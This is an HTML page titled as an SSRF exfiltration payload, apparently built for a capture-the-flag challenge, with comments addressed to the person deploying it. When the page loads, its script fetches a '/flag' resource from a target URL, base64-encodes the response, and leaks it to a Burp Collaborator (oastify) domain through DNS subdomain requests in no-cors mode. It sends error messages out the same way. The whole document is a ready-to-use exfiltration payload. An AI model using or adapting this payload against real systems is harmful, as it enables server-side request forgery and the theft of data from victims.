<!DOCTYPE html>
<html>
<head>
    <title>SSRF Exfiltration Payload</title>
</head>
<body>
    <h1>Exfiltrating... please wait.</h1>
    <script>
        // --- CONFIGURATION ---

        // 1. The full, absolute URL to the resource you want to steal.
        const targetUrl = "https://tar-award-writers-controllers.trycloudflare.com/flag";

        // 2. Your Burp Collaborator / Oastify domain.
        //    (I see you're using oastify.com, which is great)
        const collaboratorDomain = "9u41jtj5jngqfepor32y9vth288zwwkl.oastify.com";


        // --- EXPLOIT LOGIC ---
        async function exfiltrateData() {
            try {
                // Fetch the flag from the target's own origin. THIS IS THE KEY FIX.
                const response = await fetch(targetUrl);

                if (!response.ok) {
                    throw new Error(`Flag fetch failed with status: ${response.status}`);
                }

                const flagText = await response.text();

                // Base64-encode the flag to make it safe for a URL subdomain.
                const encodedFlag = btoa(flagText.trim());

                // Construct the URL that will leak the data to our server.
                const exfilUrl = `https://flag-${encodedFlag}.${collaboratorDomain}`;

                // Send the data. We use 'no-cors' mode to prevent the browser
                // from blocking the request, as we don't care about the response.
                await fetch(exfilUrl, { mode: 'no-cors' });

            } catch (error) {
                // If anything goes wrong, send the error message to your server.
                // This is extremely helpful for debugging!
                const encodedError = btoa(error.message);
                const errorUrl = `https://error-${encodedError}.${collaboratorDomain}`;
                await fetch(errorUrl, { mode: 'no-cors' });
            }
        }

        exfiltrateData();
    </script>
</body>
</html>
